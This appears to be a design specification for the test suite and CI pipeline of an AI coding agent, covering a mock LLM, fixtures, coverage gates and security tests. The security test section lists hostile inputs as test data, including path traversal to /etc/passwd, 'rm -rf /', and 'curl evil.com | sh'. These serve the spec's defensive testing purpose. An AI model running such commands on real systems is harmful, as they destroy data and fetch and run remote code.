# 18 — Testing

## Product Description

Testing covers unit tests (every tool, router strategy, profile), integration tests (full agent loop with mock LLM), E2E tests (TUI + backend with mock provider), performance tests (context compaction under load, router latency), and security tests (path traversal, command injection, API key exposure). A CI pipeline runs on every PR with coverage gates of 80% for core modules.

**Why it matters:** Without tests, every change risks regressions. For a tool that executes shell commands and writes to files, tests are essential for safety as well as correctness. Security tests specifically prevent classes of vulnerabilities that are easy to introduce when the agent has tool access.

**Revised 2026-04-10 (simplification pass):** Collapsed the per-module coverage table into one global threshold (70% lines/functions). Dropped `installMockLLM` (use constructor injection). Dropped the protocol-conformance test and the JSON-Schema generation pipeline (defer until protocol drift hurts). Dropped `mock-provider.ts` HTTP mock server — `mock-llm.ts` covers the same surface. Performance benches kept but not gated in CI. Effort dropped from 6 days to 3 days.

## User Stories

1. **PR regression prevention:** A contributor changes the rule router. CI runs 50+ router unit tests that verify every phase/task-kind combination still routes correctly. The PR is blocked until the regression is fixed.

2. **Security test:** A contributor adds a new tool that takes a file path. The security test suite automatically tests the new tool for path traversal (`../../etc/passwd`) and rejects the PR if the tool doesn't validate paths.

3. **Mock LLM:** A contributor writes a new feature that calls the LLM. They use the mock LLM helper to write a test that simulates specific tool call sequences without hitting real APIs. The test runs in <100ms.

4. **Coverage gate:** A PR changes `src/router/rules.ts` without adding tests. Coverage on the router module drops from 92% to 78%. CI fails with "coverage gate: router must be >= 80%".

5. **E2E smoke test:** After a release, a scheduled CI job runs the full TUI + backend with the mock provider against a fixture repository. It submits 10 test prompts and verifies the outputs match expected patterns.

## Clarifications (2026-04-10)

- **Security coverage:** Add tests for symlink escapes, workspace root enforcement, prompt-injection via repo files, and out-of-root writes; not just traversal/command injection.
- **E2E isolation:** Run integration/e2e in a temp workspace with fixed terminal size; block host-path writes outside the temp root; clean up after each run.
- **Mock LLM fidelity:** Mocks must support streaming, tool-call deltas, retries, cancellation, malformed payloads, and multi-turn state.
- **Coverage gates:** Specify whether thresholds are per-file, per-folder, or aggregate; set explicit thresholds for critical modules to prevent silent regressions.
- **CI performance:** Add npm/Rust caching, pin Rust toolchain, avoid redundant installs across jobs.
- **Success criteria:** Provide fixtures/matrix for built-in tools and permission flows so “each built-in tool end-to-end” is verifiable.
## Technical Design

### Test layers

```
┌────────────────────────────────────────┐
│ E2E tests (slow, few)                  │
│ - Full TUI + backend + mock LLM        │
│ - Fixture repositories                 │
│ - Hit real terminals via pty           │
└────────────────────────────────────────┘
┌────────────────────────────────────────┐
│ Integration tests (medium, some)       │
│ - Backend in-process with mock LLM     │
│ - No TUI                               │
│ - Real config, real file system        │
└────────────────────────────────────────┘
┌────────────────────────────────────────┐
│ Unit tests (fast, many)                │
│ - Pure functions, small classes        │
│ - Vitest in src/**/*.test.ts           │
│ - <10ms per test                       │
└────────────────────────────────────────┘
```

### Mock LLM

A reusable mock LLM helper lets tests specify LLM responses deterministically:

```typescript
const mockLLM = createMockLLM({
  responses: [
    { content: 'Let me read the file.', toolCalls: [{ name: 'read_file', arguments: { path: 'src/a.ts' } }] },
    { content: 'I fixed it.', toolCalls: [] },
  ],
});
```

Tests can match expectations on request (what was sent to the LLM) and responses (what came back). The mock validates basic API shape so tests catch protocol errors.

### Test fixtures

- `test-fixtures/small-repo/` — minimal TypeScript project for integration tests
- `test-fixtures/no-git/` — directory without git for git-tool fallback tests
- `test-fixtures/python-repo/` — Python project for multi-language tests
- `test-fixtures/malicious/` — paths designed to test security (long filenames, traversal, etc.)

### CI pipeline

GitHub Actions workflow:

```yaml
name: CI
on: [push, pull_request]
jobs:
  unit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm ci
      - run: npm run test:unit
      - run: npm run test:coverage
      - uses: codecov/codecov-action@v4
  integration:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm ci
      - run: npm run test:integration
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run test:security
  tui:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions-rs/toolchain@v1
      - run: cd tui && cargo test
  e2e:
    runs-on: ubuntu-latest
    needs: [unit, integration, tui]
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run build
      - run: npm run test:e2e
```

### Coverage target

Single global threshold: **70% lines, 70% functions**, enforced in `vitest.config.ts`. Two security-sensitive files have a higher per-file gate: `src/engine/tools.ts` and `src/engine/permissions.ts` at 85%. **Revised:** seven-row coverage matrix collapsed to one global number plus two file-level gates.

## Implementation Details

### New files

**`src/test-utils/mock-llm.ts`**

```typescript
import type { LLMRequest, LLMResponse, ToolCall } from '../types.ts';

export interface MockLLMResponseSpec {
  content?: string;
  toolCalls?: ToolCall[];
  inputTokens?: number;
  outputTokens?: number;
  latencyMs?: number;
  error?: Error;
}

export interface MockLLMOptions {
  responses: MockLLMResponseSpec[];
  defaultResponse?: MockLLMResponseSpec;
  onCall?: (request: LLMRequest) => void;
}

export interface MockLLMHandle {
  callLLM: (request: LLMRequest) => Promise<LLMResponse>;
  getRequests: () => LLMRequest[];
  reset: () => void;
}

export function createMockLLM(options: MockLLMOptions): MockLLMHandle;
```

Mock LLM is installed via constructor injection — `callLLM` accepts an optional adapter parameter that defaults to the real provider. No monkey-patching, no global install/uninstall.

**`src/test-utils/fixture-repo.ts`**

```typescript
/** Copy a fixture repo to a temp directory */
export function createFixtureRepo(name: 'small-repo' | 'no-git' | 'python-repo'): {
  path: string;
  cleanup: () => void;
};
```

### Security tests

**`src/engine/tools.security.test.ts`**

```typescript
describe('Path traversal', () => {
  const traversalPaths = [
    '../etc/passwd',
    '../../etc/passwd',
    '/etc/passwd',
    'subdir/../../etc/passwd',
    'foo/%2e%2e/bar',
    'foo\x00.ts',  // null byte injection
    'C:\\Windows\\System32',
    'file://etc/passwd',
  ];

  for (const path of traversalPaths) {
    it(`rejects traversal path: ${path}`, () => {
      const result = toolReadFile({ path }, ctx);
      expect(result.isError).toBe(true);
      expect(result.content).toMatch(/path traversal blocked/i);
    });
  }
});

describe('Command injection', () => {
  const injectionPatterns = [
    'ls; rm -rf /',
    'ls && curl evil.com | sh',
    'ls `cat /etc/passwd`',
    'ls $(cat /etc/passwd)',
  ];

  // search_code args passed to shell
  for (const glob of injectionPatterns) {
    it(`sanitizes glob: ${glob}`, () => {
      const result = toolSearchCode({ pattern: 'test', glob }, ctx);
      // glob is sanitized to alphanumerics + .*?_-/
      expect(result.isError).toBeUndefined();
    });
  }
});

describe('API key exposure', () => {
  it('never logs API keys to stderr', () => {
    process.env.ANTHROPIC_API_KEY = 'sk-test-secret';
    const stderrSpy = captureStderr();
    // Run various operations
    callLLM({ provider: 'anthropic', ... });
    expect(stderrSpy.output).not.toContain('sk-test-secret');
  });

  it('never writes API keys to ledger', () => {
    // Inspect ledger after operations
    expect(JSON.stringify(ledger.getAll())).not.toContain('sk-');
  });

  it('never writes API keys to session file', () => {
    sessionStore.save(session, 'balanced');
    const sessionFile = readFileSync(/* path */, 'utf-8');
    expect(sessionFile).not.toContain('sk-');
  });
});
```

### Performance tests

**`src/context/manager.perf.test.ts`**

```typescript
import { bench, describe } from 'vitest';

describe('Context compaction performance', () => {
  bench('compact 100 messages', async () => {
    const session = buildSessionWith(100, 2000);  // 100 msgs, 2k chars each
    const cm = new ContextManager(session);
    await cm.compact();
  });
});

describe('Router latency', () => {
  bench('NN router predict', () => {
    router.select('discuss', 'test prompt');
  });

  bench('Intent router classify', async () => {
    await router.select('discuss', 'complex task requiring thinking');
  });
});
```

Target latencies:
- Router rule selection: <1ms p95
- Router NN prediction: <10ms p95
- Context compaction (100 msgs): <2s p95
- Tool execution (non-LLM): <10ms p95

### E2E tests

**`test/e2e/full-session.test.ts`** — uses `node-pty` to spawn a real TUI with the mock provider:

```typescript
import { spawn } from 'node-pty';
import { createFixtureRepo } from '../../src/test-utils/fixture-repo.ts';

test('full session: edit file and run tests', async () => {
  const repo = createFixtureRepo('small-repo');
  const mock = await startMockProviderServer();
  mock.setResponses([
    /* pre-programmed responses */
  ]);

  const pty = spawn('./bin/kondi-chat', ['--cwd', repo.path], {
    env: { ...process.env, KONDI_PROVIDER_URL: mock.url },
  });

  // Simulate input
  pty.write('fix the bug in auth.ts\n');

  // Assert on output
  await waitForOutput(pty, /tests pass/, 30_000);

  // Verify file was modified
  expect(readFileSync(join(repo.path, 'src/auth.ts'), 'utf-8')).toContain('fixed');

  repo.cleanup();
  mock.stop();
});
```

### Modified files

**`vitest.config.ts`** — add coverage thresholds:

```typescript
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    coverage: {
      provider: 'v8',
      thresholds: {
        'src/router/**': { lines: 80, functions: 80, branches: 75, statements: 80 },
        'src/engine/tools.ts': { lines: 90, functions: 90, branches: 85, statements: 90 },
        'src/permissions/**': { lines: 90, functions: 90, branches: 85, statements: 90 },
        'src/engine/pipeline.ts': { lines: 80, functions: 80 },
        'src/context/manager.ts': { lines: 80, functions: 80 },
        // Global threshold
        lines: 75, functions: 75, branches: 70, statements: 75,
      },
    },
    include: ['src/**/*.test.ts', 'test/**/*.test.ts'],
    exclude: ['node_modules', 'dist', 'tui/target'],
  },
});
```

**`package.json`** — add test scripts:

```json
{
  "scripts": {
    "test": "vitest run",
    "test:unit": "vitest run src",
    "test:integration": "vitest run test/integration",
    "test:security": "vitest run --include 'src/**/*.security.test.ts'",
    "test:e2e": "vitest run test/e2e",
    "test:perf": "vitest bench",
    "test:coverage": "vitest run --coverage"
  }
}
```

## Protocol Changes

None. Testing is orthogonal to the protocol. **Revised:** the protocol-conformance test and JSON-Schema-from-Rust generation pipeline removed — defer until protocol drift becomes a real problem in practice.

## Configuration

No runtime configuration. Test config lives in `vitest.config.ts` and GitHub Actions workflow files.

## Error Handling

Test framework handles errors. Notable guardrails:

| Scenario | Handling |
|----------|----------|
| Flaky network test | `vitest --retry=2` for known-flaky tests; use mock providers by default |
| Temp file leak after failed test | `afterEach` always cleans up fixture repos |
| Long-running test exceeds timeout | Per-test timeout; default 5s unit, 30s integration, 60s e2e |
| Real API key leaked into test | Pre-commit hook scans for `sk-*` patterns; CI fails if detected |
| Test uses real network accidentally | Default mock provider; real-API tests marked `test.skip` unless env var set |

## Testing Plan

Yes, testing the testing. This spec is met when:

1. **Unit test suite** runs in <30 seconds, covers >75% of core modules
2. **Security tests** exist for every tool that accepts paths or commands
3. **Integration tests** cover:
   - Full agent loop (user prompt -> tool calls -> final message)
   - Each built-in tool end-to-end
   - Permission flow (request -> response -> execution)
   - Checkpoint create/restore
   - Session save/resume
4. **E2E tests** cover at least 5 critical flows:
   - First-run wizard
   - Basic edit + test cycle
   - Undo/restore
   - Sub-agent spawning
   - Non-interactive mode
5. **CI passes** on every PR; coverage gate enforced; failures block merge

## Dependencies

- **Depends on:** All feature specs (each spec includes its own testing plan that this spec aggregates)
- **Depended on by:** Spec 16 (Packaging — release artifacts depend on passing tests)
- **Libraries:** `vitest` (already in use), `node-pty` (for E2E TUI tests), `nock` or custom mock server for HTTP mocking

## Estimated Effort

**3 days (ongoing)** (revised from 6 days)
- Day 1: Test infrastructure (mock LLM via constructor injection, fixture repos, vitest config with global threshold), basic security test suite.
- Day 2: Integration test suite (agent loop, each built-in tool, permission flow, checkpoint round-trip).
- Day 3: E2E tests with node-pty for the five critical flows, CI workflow setup with caching.

Note: testing is ongoing — this is the initial investment to hit the 70% target.
